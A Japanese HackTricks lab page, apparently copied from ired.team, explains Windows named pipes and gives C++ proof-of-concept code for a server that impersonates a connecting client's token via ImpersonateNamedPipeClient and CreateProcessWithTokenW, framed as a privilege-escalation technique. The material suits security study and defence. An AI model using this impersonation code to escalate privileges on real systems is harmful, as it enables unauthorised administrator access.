# 名前付きパイプクライアントのなりすまし

## 名前付きパイプクライアントのなりすまし

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

**この情報は** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation) **からコピーされました**

## 概要

`pipe`は、プロセスが通信やデータ交換に使用できる共有メモリのブロックです。

`Named Pipes`は、プロセスが異なるネットワークにあっても、関連性のない2つのプロセス間でデータを交換できるようにするWindowsのメカニズムです。クライアント/サーバーアーキテクチャに非常に似ており、`named pipe server`（名前付きパイプサーバー）と名前付きの`pipe client`（パイプクライアント）という概念が存在します。

名前付きパイプサーバーは、あらかじめ定義された名前で名前付きパイプを開き、その後、名前付きパイプクライアントは既知の名前を介してそのパイプに接続できます。接続が確立されると、データ交換を開始できます。

このラボは、以下を可能にするシンプルなPoCコードに関するものです：

* 1つのクライアント接続を受け入れるシングルスレッドのダム名前付きパイプサーバーを作成する
* 名前付きパイプサーバーが名前付きパイプにシンプルなメッセージを書き込むことで、パイプクライアントがそれを読むことができる

## コード

以下は、サーバーとクライアントの両方のPoCです：

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## 実行

以下は、名前付きパイプサーバーと名前付きパイプクライアントが期待通りに動作していることを示しています：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

名前付きパイプの通信はデフォルトでSMBプロトコルを使用することに注意が必要です：

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

プロセスが名前付きパイプ `mantvydas-first-pipe` へのハンドルをどのように維持しているかを確認します：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

同様に、クライアントが名前付きパイプへのオープンハンドルを持っているのを見ることができます：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

powershellで私たちのパイプを見ることもできます：
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
```markdown
## トークンのなりすまし

{% hint style="info" %}
クライアントプロセスのトークンをなりすましするためには、パイプを作成するサーバープロセスが **`SeImpersonate`** トークン権限を持っている必要があります。
{% endhint %}

名前付きパイプサーバーは、`ImpersonateNamedPipeClient` APIコールを利用して名前付きパイプクライアントのセキュリティコンテキストをなりすまし、名前付きパイプサーバーの現在のスレッドのトークンを名前付きパイプクライアントのトークンに変更することが可能です。

なりすましを実現するために、名前付きパイプサーバーのコードを以下のように更新できます - 変更点は25行目以降にあります:
```
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
```markdown
管理者@offense.local セキュリティコンテキストで実行されているクライアントでサーバーに接続すると、名前付きサーバーパイプのメインスレッドが名前付きパイプクライアント - offense\administrator のトークンを引き受けたことがわかります。これは、PipeServer.exe 自体が ws01\mantvydas セキュリティコンテキストで実行されているにもかかわらずです。権限昇格には良い方法のようですか？

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを **共有する**。

</details>
```
